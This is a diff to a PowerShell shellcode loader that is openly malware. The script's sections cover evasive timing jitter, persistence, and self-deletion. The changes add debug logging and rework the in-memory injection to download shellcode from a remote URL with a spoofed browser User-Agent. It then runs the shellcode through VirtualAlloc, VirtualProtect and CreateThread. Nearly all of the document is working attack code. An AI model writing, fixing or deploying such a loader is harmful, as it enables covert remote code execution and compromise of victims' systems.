@@ -70,8 +70,8 @@ if ($hour -lt 2 -or $hour -ge 5) {
     if ($sleepSeconds -gt 0) { Start-Sleep -Seconds $sleepSeconds }
 }
 
-# Random execution jitter (1–10 minutes)
-Start-Sleep -Seconds (Get-Random -Min 60 -Max 600)
+# Random execution jitter (reduced for debugging)
+Start-Sleep -Seconds (Get-Random -Min 1 -Max 5)
 
 # ============================================================
 # 5. PERSISTENCE – INSTALL ONLY ONCE (flag file w/ randomized name)
@@ -136,24 +136,43 @@ function Get-Shellcode {
     $client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
     $client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
     $client.DefaultRequestHeaders.Add("Accept-Language", "en-US,en;q=0.5")
-    $client.Timeout = [System.TimeSpan]::FromSeconds(30)
+    $client.Timeout = [System.TimeSpan]::FromSeconds(60)
     try {
+        Write-Host "[+] Attempting download from: $Url" -ForegroundColor Yellow
         $task = $client.GetByteArrayAsync($Url)
         $task.Wait()
-        return $task.Result
+        $result = $task.Result
+        Write-Host "[+] Download completed: $($result.Length) bytes" -ForegroundColor Green
+        return $result
     } catch {
+        Write-Host "[-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
         return $null
     } finally {
         $client.Dispose()
     }
 }
 
+Write-Host "[+] Starting shellcode download..." -ForegroundColor Yellow
 $shellcode = Get-Shellcode -Url $shellcodeUrl
-if (-not $shellcode -or $shellcode.Length -lt 50) { exit }
+if (-not $shellcode -or $shellcode.Length -lt 50) { 
+    Write-Host "[-] Shellcode download failed or too small ($($shellcode.Length) bytes)" -ForegroundColor Red
+    exit 
+}
+
+# DEBUG: Save shellcode to disk for analysis
+[IO.File]::WriteAllBytes("$env:TEMP\debug_shellcode.bin", $shellcode)
+Write-Host "[+] Shellcode saved to: $env:TEMP\debug_shellcode.bin" -ForegroundColor Green
+
+# DEBUG: Show first 32 bytes in hex
+$hexHeader = ($shellcode[0..31] | ForEach-Object { "{0:X2}" -f $_ }) -join " "
+Write-Host "[+] Shellcode header: $hexHeader" -ForegroundColor Cyan
 
 # ============================================================
-# 7. INJECT SHELLCODE INTO CURRENT PROCESS (memory only, no disk write)
+# 7. ARCHITECTURE CHECK & INJECTION
 # ============================================================
+Write-Host "[+] PowerShell architecture: $([Environment]::Is64BitProcess) (True=x64, False=x86)" -ForegroundColor Cyan
+
+# Improved injection with CreateThread and better error handling
 $injectCode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -161,26 +180,63 @@ public class MemoryInject {
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
     [DllImport("kernel32.dll")]
     public static extern IntPtr GetCurrentProcess();
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+    
     public static void Run(byte[] payload) {
-        IntPtr hProc = GetCurrentProcess();
-        uint oldProtect = 0;
-        IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-        UIntPtr bytesWritten;
-        WriteProcessMemory(hProc, alloc, payload, (uint)payload.Length, out bytesWritten);
-        VirtualProtect(alloc, (uint)payload.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
-        CreateRemoteThread(hProc, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+        try {
+            Console.WriteLine("[+] Allocating memory: " + payload.Length + " bytes");
+            IntPtr alloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x3000, 0x40); // MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+            uint lastError = Marshal.GetLastWin32Error();
+            Console.WriteLine("[+] VirtualAlloc result: 0x" + alloc.ToString("X16") + ", Error: " + lastError);
+            
+            if (alloc == IntPtr.Zero) {
+                Console.WriteLine("[-] VirtualAlloc failed");
+                return;
+            }
+            
+            Console.WriteLine("[+] Copying shellcode to memory");
+            Marshal.Copy(payload, 0, alloc, payload.Length);
+            
+            Console.WriteLine("[+] Changing memory protection to PAGE_EXECUTE_READ");
+            uint oldProtect = 0;
+            bool protectResult = VirtualProtect(alloc, (uint)payload.Length, 0x20, out oldProtect); // PAGE_EXECUTE_READ
+            lastError = Marshal.GetLastWin32Error();
+            Console.WriteLine("[+] VirtualProtect result: " + protectResult + ", Error: " + lastError);
+            
+            Console.WriteLine("[+] Creating thread for execution");
+            IntPtr thread = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+            lastError = Marshal.GetLastWin32Error();
+            Console.WriteLine("[+] CreateThread result: 0x" + thread.ToString("X16") + ", Error: " + lastError);
+            
+            if (thread == IntPtr.Zero) {
+                Console.WriteLine("[-] CreateThread failed");
+                return;
+            }
+            
+            Console.WriteLine("[+] Shellcode execution initiated, waiting for thread...");
+            WaitForSingleObject(thread, 0xFFFFFFFF);
+            Console.WriteLine("[+] Thread completed");
+        } catch (Exception ex) {
+            Console.WriteLine("[-] Injection failed: " + ex.Message);
+        }
     }
 }
 '@
+
 Add-Type $injectCode
-[MemoryInject]::Run($shellcode)
+Write-Host "[+] Starting shellcode injection..." -ForegroundColor Yellow
+try {
+    [MemoryInject]::Run($shellcode)
+    Write-Host "[+] Injection completed" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Injection failed: $($_.Exception.Message)" -ForegroundColor Red
+}
 
 # ============================================================
 # 8. CLEANUP (delayed, optional – remove script itself after 2 hours)
